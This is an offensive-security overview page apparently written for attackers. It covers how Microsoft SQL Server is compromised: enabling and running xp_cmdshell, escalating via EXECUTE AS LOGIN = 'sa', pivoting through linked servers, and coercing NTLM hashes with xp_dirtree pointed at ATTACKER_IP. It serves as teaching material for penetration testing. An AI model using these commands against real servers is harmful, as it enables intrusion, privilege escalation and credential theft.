---
technology: "MSSQL (Microsoft SQL Server)"
kind: overview
audience: offensive-security
family: databases
status: "confirmed (23 writeup files pass the re-gated command-context gate)"
layer: relational database server (TDS protocol on 1433/tcp)
language: "C++ (server); T-SQL surface"
homepage: "https://learn.microsoft.com/en-us/sql/sql-server/"
provenance: "corpus-grounded (23 writeup files pass the re-gated command-context gate: T-SQL invocations (xp_cmdshell, sp_configure, EXECUTE AS LOGIN/USER, IS_SRVROLEMEMBER/SUSER_NAME, xp_dirtree, BULK INSERT, OPENROWSET, sp_addlinked*), MSSQL client tools (impacket-mssqlclient, sqlcmd, netexec mssql), MSSQLSvc SPN ticket targets, ntlmrelayx MSSQL protocol-client loads, 1433/tcp nmap context; structure-pass hint was 14 on xp_cmdshell/mssqlclient/sqsh only) + upstream-verified: Microsoft Learn xp_cmdshell server-configuration doc, EXECUTE AS (T-SQL) doc, Linked Servers (Database Engine) doc, impacket mssqlclient.py source (flags -windows-auth/-k/-port/-db/-hashes/-command), 2026-11-12."
---

# MSSQL

> The database that is also a domain member: every SQL login is a potential Kerberos principal, every stored procedure a possible NTLM leak, and one `sysadmin` role away from an operating-system shell.

## What it is

Microsoft SQL Server is the Windows estate's relational database server, speaking the proprietary TDS protocol (nmap service `ms-sql-s`) on **1433/tcp** by default (the SQL Browser helper answers UDP 1434 for named-instance routing; named instances live on random high ports — observed: one named instance answering on 6520). Authentication is a fork that decides everything downstream: **SQL logins** (`sa` being the god-account) versus **Windows/Integrated auth**, where the SQL login maps to an AD principal — and from that moment Kerberos tickets, SPNs named `MSSQLSvc/host:port`, and machine-account behaviour all apply (the ticket machinery lives in the kerberos unit).

The operator's mental model is a **permission ladder inside the T-SQL engine**: login → server roles (`sysadmin` at the top, `bulkadmin`/`dbcreator` mid-ladder) → database roles → per-object grants. Two engine features convert that ladder into code execution and credential theft without any memory-corruption bug: `xp_cmdshell` (an extended stored procedure that runs OS commands, disabled by default but enabled by two `sp_configure` calls) and the impersonation system (`EXECUTE AS LOGIN/USER`, granted by `IMPERSONATE` permissions that DBAs hand out far too readily). Upstream: Microsoft documents xp_cmdshell as disabled-on-install precisely because "newly developed code shouldn't use it" — every enabled instance is a deliberate or inherited legacy decision.

23 observed engagements pass the MSSQL gate, and the spread is the story: pure client work (mssqlclient/sqlcmd against found credentials), the xp_cmdshell RCE chain, impersonation abuse (three), linked-server pivots across domains (two), coerced-NTLM via `xp_dirtree`/`BULK INSERT` into Responder (four), and MSSQL as an ntlmrelayx relay target (three).

## The anatomy that matters on an engagement

    port scan → 1433/tcp ms-sql-s (or named instance on high port)
      → auth fork: SQL login (sa?) | Windows auth (AD principal, Kerberos-capable)
      → role check: SELECT IS_SRVROLEMEMBER('sysadmin')   ← 1 = game over path
      → RCE ladder:
          EXEC sp_configure 'show advanced options',1; RECONFIGURE;
          EXEC sp_configure 'xp_cmdshell',1;              RECONFIGURE;
          EXEC xp_cmdshell 'whoami';                       (runs as the service account)
      → no sysadmin? impersonation: EXECUTE AS LOGIN = 'sa'   (needs IMPERSONATE)
      → cross-server pivot: linked servers (OPENQUERY / EXEC (...) AT <link>)
      → credential coercion: xp_dirtree '\\ATTACKER_IP\x' / BULK INSERT FROM UNC
            → service account NTLMv2 → crack (hashcat 5600) or relay (ntlmrelayx)
      → Kerberos side: MSSQLSvc SPN → kerberoast / silver ticket into the instance

Three structural properties drive most findings:

- **xp_cmdshell is two config statements away, forever.** It ships disabled; every observed chain that reaches `sysadmin` ends with the same `sp_configure` pair (four engagements). Obfuscated variants (`Xp_cMdsHelL`, case-randomized to beat blacklists — field-observed) prove defenders know this and try to filter it in the wrong layer.
- **IMPERSONATE grants are delegated passwords.** `EXECUTE AS LOGIN = 'sa'` with a granted IMPERSONATE is a full privilege escalation one-liner (field-observed); impacket's mssqlclient ships an `enum_impersonate` command because it is that reliable (field-observed).
- **The server will authenticate wherever you point it.** `xp_dirtree`, `BULK INSERT ... FROM '\\...', OPENROWSET`, and linked-server logins all make the *service account* originate an NTLM handshake — capture it with Responder, crack it, or relay it (the full NTLM story is the [[ntlm]] unit).

## Where you'll meet it

- **Windows domain interiors** — 1433 open on a member server or DC (observed: several engagements fingerprint `ms-sql-s` first). The instance is simultaneously a data store, an execution primitive, and an AD attack surface (service accounts with SPNs, GMSA-backed logins).
- **Edge-facing apps with a DB string leak** — connection strings in web configs, .NET binaries, macro-bearing spreadsheets (an observed XLS macro carried the TDS connection string), monitoring apps (field-observed). One valid login is entry; the ladder does the rest.
- **Post-shell Windows boxes** — `sqlcmd` is preinstalled on the server OS: `sqlcmd -S '(local)' -U db_admin -P ...` turns any found credential file into database access without uploading tools (observed engagements, incl. an ADSync entropy dump).
- **Cross-domain trusts** — linked servers configured with `sa` mapping on the far side execute your T-SQL in the remote domain (an observed forest-compromise finisher).

## Reading the server's mind

1. **`1433/tcp open ms-sql-s Microsoft SQL Server 2019 15.00.2000`** — the nmap line gives the engine generation (15 = 2019, 16 = 2022), which calibrates feature availability (always test xp_cmdshell anyway).
2. **The netexec mssql probe** validates credentials at TDS speed and flags `(Pwn3d!)` for sysadmin-class logins (observed: a `sa:<password> (Pwn3d!)` hit).
3. **`IS_SRVROLEMEMBER('sysadmin')` returning 1** is the fork in every methodology: rung 1 (enable xp_cmdshell) versus rung 2 (hunt IMPERSONATE grants).
4. **A named instance on a weird port** (6520 in one observed engagement) means SQL Browser/instance discovery, not a custom service — probe it with the same clients.
5. **Any UNC-eating statement** (`xp_dirtree`, `BULK INSERT`, `OPENROWSET`) plus an idle Responder is a credential-harvest rig: the service account authenticates to *you* (3 observed engagements — cross-ref [[ntlm]]).

## Where to go next

[[mssql-bug-bounty]] — the phased agent methodology: fingerprinting and auth, role/impersonation enumeration, the xp_cmdshell chain, linked-server pivots, coerced-NTLM and relay integrations, and the Kerberos (silver-ticket) path into the instance.
